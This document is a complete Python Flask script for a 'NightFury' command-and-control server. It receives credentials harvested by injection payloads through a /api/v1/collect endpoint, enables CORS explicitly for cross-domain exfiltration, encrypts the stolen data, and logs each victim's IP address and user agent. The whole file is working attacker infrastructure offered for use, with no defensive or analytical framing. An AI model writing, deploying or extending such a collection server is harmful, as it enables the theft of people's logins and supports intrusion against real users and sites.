#!/usr/bin/env python3
import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from cryptography.fernet import Fernet
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for cross-domain exfiltration

# Configuration
LOG_FILE = "/home/ubuntu/nightfury/logs/harvested_creds.json"

# Generate a key for encryption. In a real scenario, this should be loaded securely from config.
# For demonstration, we'll generate one if it doesn't exist.
KEY_FILE = "/home/ubuntu/nightfury/config/c2_encryption.key"
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
else:
    with open(KEY_FILE, "rb") as key_file:
        key = key_file.read()

fernet = Fernet(key)

logging.basicConfig(
    filename="/home/ubuntu/nightfury/logs/c2_server.log",
    level=logging.INFO,
    format=\'%(asctime)s - %(levelname)s - %(message)s\'
)

def encrypt_data(data):
    """Encrypts data using Fernet symmetric encryption."""
    if isinstance(data, dict):
        data_str = json.dumps(data)
    else:
        data_str = str(data)
    encrypted_data = fernet.encrypt(data_str.encode())
    return encrypted_data.decode() # Store as string

def decrypt_data(encrypted_data):
    """Decrypts data using Fernet symmetric encryption."""
    decrypted_data = fernet.decrypt(encrypted_data.encode()).decode()
    try:
        return json.loads(decrypted_data)
    except json.JSONDecodeError:
        return decrypted_data

def save_credentials(data):
    """Securely logs harvested credentials to a JSON file, encrypting sensitive data."""
    encrypted_data = encrypt_data(data)
    entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "source_ip": request.remote_addr,
        "user_agent": request.headers.get(\'User-Agent\'),
        "encrypted_data": encrypted_data
    }
    
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")
        return True
    except Exception as e:
        logging.error(f"Failed to save credentials: {str(e)}")
        return False

@app.route(\'/api/v1/collect\', methods=[\'POST\'])
def collect():
    """Endpoint for harvesting credentials from injection payloads."""
    try:
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict() or request.data.decode()
        logging.info(f"Received collection request from {request.remote_addr}")
        
        if save_credentials(data):
            return jsonify({"status": "success", "msg": "Data synchronized"}), 200
        else:
            return jsonify({"status": "error", "msg": "Storage failure"}), 500
            
    except Exception as e:
        logging.error(f"Error in collection endpoint: {str(e)}")
        return jsonify({"status": "error", "msg": "Internal processing error"}), 400

@app.route(\'/health\', methods=[\'GET\'])
def health():
    """Health check endpoint for the C2 server."""
    return jsonify({"status": "online", "server": "NightFury-C2"}), 200

if __name__ == \'__main__\':
    print("[*] NightFury C2 Collection Server Starting...")
    print(f"[*] Endpoint: http://0.0.0.0:8080/api/v1/collect")
    print(f"[*] Logging to: {LOG_FILE}")
    print(f"[*] Encryption key stored at: {KEY_FILE}")
    app.run(host=\'0.0.0.0\', port=8080)
